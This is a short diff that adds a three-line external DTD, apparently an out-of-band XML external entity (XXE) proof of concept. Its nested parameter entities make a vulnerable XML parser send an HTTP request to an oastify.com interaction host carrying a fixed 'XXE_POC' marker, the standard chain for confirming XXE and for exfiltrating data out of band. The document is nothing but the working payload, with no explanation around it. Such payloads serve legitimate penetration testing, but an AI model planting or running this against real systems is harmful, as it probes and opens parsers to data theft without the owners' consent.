@@ -1,0 +1,3 @@
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://4tyhvpdz15ocxm3g2iz0642z3q9hx9ly.oastify.com/?x=XXE_POC'>">
+%eval;
+%exfil;
